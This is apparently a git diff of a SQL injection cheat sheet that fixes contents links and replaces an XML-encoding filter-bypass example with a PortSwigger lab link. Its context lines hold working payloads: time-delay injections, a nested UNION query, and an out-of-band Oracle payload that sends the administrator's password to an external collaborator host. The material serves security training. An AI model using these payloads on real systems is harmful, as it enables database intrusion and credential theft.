@@ -28,7 +28,7 @@
 24. [SQL Injection with LOAD_FILE and INTO OUTFILE](#sql-injection-with-load_file-and-into-outfile)
 25. [Exceptional Payloads](#exceptional-payloads)
 26. [Wordlist](#wordlist)
-27. [XML based filter bypass via XML encoding]
+27. [XML based filter bypass via XML encoding](XML-based-filter-bypass-via-XML-encoding)
 ___
 
 ### External Links for SQLi Techniques
@@ -360,7 +360,7 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
     ‘;%5waitfor%5delay%5’0:0:5′%5 — %5
     ‘ WAITFOR DELAY ‘0:0:5’ —
 ```
-**Routed SQL Injection POC:** [Click...](https://youtu.be/mNj73yI8GEk?si=yuw2-_aGF0BjQuUk)
+**Routed SQL Injection POC:** [Click](https://youtu.be/mNj73yI8GEk?si=yuw2-_aGF0BjQuUk)
 
 ### Out of band interaction
 ```sql
@@ -368,7 +368,5 @@ and 1=2 union select "1 union select 1,2,3,4-- -",2,3-- - >> Query inside query
 ' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.otlt0n83nmuj1egrjwt2qjdlrcx3lufi4.oastify.com/"> %remote;]>'),'/l') FROM dual-- >> For retrieve data
 ```
 ## XML based filter bypass via XML encoding
-The sequence ```&#x53;ELECT``` is a form of obfuscation in XML where ```&#x53;``` is the hexadecimal code for the uppercase letter ```S```. This means ```&#x53;ELECT``` is equivalent to the word "SELECT". This technique is often used to bypass security filters that may block specific keywords like "SELECT".
-```
-<storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
-```
+
+**Portswigger Academy Lab:** [Click](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
